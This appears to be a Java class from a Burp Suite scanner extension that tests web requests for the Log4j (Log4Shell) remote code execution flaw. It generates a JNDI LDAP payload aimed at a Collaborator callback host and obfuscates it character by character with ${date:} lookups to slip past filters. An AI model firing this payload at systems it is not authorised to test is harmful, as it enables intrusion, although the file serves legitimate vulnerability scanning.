package BrianW.AKA.BigChan.PowerScanner;

import BrianW.AKA.BigChan.Tools.CollaboratorData;
import BrianW.AKA.BigChan.Tools.Global;
import BrianW.AKA.BigChan.Tools.utils;
import burp.*;

import java.util.Date;

public class ScanLog4j extends Reporter {
    protected IBurpExtenderCallbacks callbacks;
    protected IExtensionHelpers helpers;

    public ScanLog4j(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        super(callbacks, helpers);
        this.callbacks = callbacks;
        this.helpers = helpers;
    }

    public IScanIssue doScanLog4j(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        byte[] resp = baseRequestResponse.getResponse();
        byte[] req = baseRequestResponse.getRequest();
        String baseName = insertionPoint.getInsertionPointName();
        byte insertionPointType = insertionPoint.getInsertionPointType();
        String baseValue = insertionPoint.getBaseValue();
        String collaboratorPayload = Global.interactionServer.getCollaboratorContext().generatePayload(true);
        callbacks.printOutput("generate log4j2 RCE collaboratorPayload: " + collaboratorPayload);
        String payload = genLog4jPayload(collaboratorPayload);
        byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
        IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                reqEvil
        );
        pairEvil.setComment(payload);
        CollaboratorData collaboratorData = new CollaboratorData(
                reporter(
                        "log4j RCE vulnerability found",
                        String.format("param: %s <br>" +
                                        "InsertionPointType: %s <br>" +
                                        "Payload: %s"
                                ,
                                baseName,
                                insertionPointType,
                                collaboratorPayload
                        ),
                        "High",
                        "Certain",
                        pairEvil
                ),
                new Date(),
                "got"
        );
        Global.interactionServer.addToPairList(collaboratorPayload, collaboratorData);
        return null;
    }
    private static String genLog4jPayload(String dns){

        return String.format("%s${%s${date:'g'}${date:'g'}${date:'t'}.%s}%s", utils.getRandomString(4), obfuscator("jndi:ldap://"), obfuscator(dns), utils.getRandomString(4));
    }
    private static String obfuscator(String payload){
        StringBuilder finalString= new StringBuilder();
        for (char chr:payload.toCharArray()) {
            String str = String.format("${date:'%s'}", chr);
            finalString.append(str);
        }
        return finalString.toString() ;
    }
}
